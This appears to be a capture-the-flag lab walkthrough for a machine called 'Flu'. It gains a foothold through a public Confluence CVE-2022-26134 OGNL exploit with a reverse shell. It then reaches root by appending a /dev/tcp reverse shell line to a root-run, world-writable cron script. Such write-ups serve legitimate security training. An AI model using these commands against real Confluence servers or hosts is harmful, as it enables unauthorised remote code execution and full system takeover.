##### Tags: `pspy`  `confluence`  `writable file`  `github`

# 🐧Flu🐧
## Enumeration
Nmap
```console
$ nmap -sC -sV 192.168.154.41 

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 02:79:64:84:da:12:97:23:77:8a:3a:60:20:96:ee:cf (ECDSA)
|_  256 dd:49:a3:89:d7:57:ca:92:f0:6c:fe:59:a6:24:cc:87 (ED25519)
8090/tcp open  http    Apache Tomcat (language: en)
| http-title: Log In - Confluence
|_Requested resource was /login.action?os_destination=%2Findex.action&permissionViolation=true
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
port 8090 is running Atlassian Confluence 7.13.6  
search google and found the script can get us a reverse shell  
https://github.com/Chocapikk/CVE-2022-26134
```console
$ python3 exploit.py -u http://192.168.154.41:8090 -l 192.168.45.213 -p 80

[-] CVE-2022-26134
[-] Confluence Pre-Auth Remote Code Execution via OGNL Injection
[-] Creator : Valentin Lobstein 

 Trying revshell at http://192.168.154.41:8090
```
```console
$ nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.213] from (UNKNOWN) [192.168.154.41] 35830

confluence@flu:/opt/atlassian/confluence/bin$ id
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence) 
```
## Privilege Escalation
upload pspy and found there is a cron job running by root  
```console
confluence@flu:/tmp$ ./pspy32s
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...

2026/02/17 13:46:01 CMD: UID=0     PID=43039  | /bin/bash /opt/log-backup.sh 
2026/02/17 13:46:01 CMD: UID=0     PID=43041  | /bin/bash /opt/log-backup.sh 
2026/02/17 13:46:01 CMD: UID=0     PID=43042  | 
2026/02/17 13:47:01 CMD: UID=0     PID=43050  | /bin/bash /opt/log-backup.sh 
2026/02/17 13:47:01 CMD: UID=0     PID=43052  | /bin/bash /opt/log-backup.sh
```
it runs the script log-backup.sh every minute by root and we have write permission on the file
```console
confluence@flu:/opt/atlassian/confluence/bin$ ls -la /opt/log-backup.sh 
-rwxr-xr-x 1 confluence confluence 408 Dec 12  2023 /opt/log-backup.sh
```
we add a reverse shell script in the file
```console
echo "/bin/sh -i >& /dev/tcp/192.168.45.213/22 0>&1" >> log-backup.sh
```
check the script has been added
```console
confluence@flu:/opt$ cat log-backup.sh
#!/bin/bash

CONFLUENCE_HOME="/opt/atlassian/confluence/"
LOG_DIR="$CONFLUENCE_HOME/logs"
BACKUP_DIR="/root/backup"
TIMESTAMP=$(date "+%Y%m%d%H%M%S")

# Create a backup of log files
cp -r $LOG_DIR $BACKUP_DIR/log_backup_$TIMESTAMP

tar -czf $BACKUP_DIR/log_backup_$TIMESTAMP.tar.gz $BACKUP_DIR/log_backup_$TIMESTAMP

# Cleanup old backups
find $BACKUP_DIR -name "log_backup_*"  -mmin +5 -exec rm -rf {} \;


/bin/sh -i >& /dev/tcp/192.168.45.213/22 0>&1
```
start nc listener and wait for a minute
```console
$ nc -lvnp 22               
listening on [any] 22 ...
connect to [192.168.45.213] from (UNKNOWN) [192.168.154.41] 49164
# id
uid=0(root) gid=0(root) groups=0(root)
```


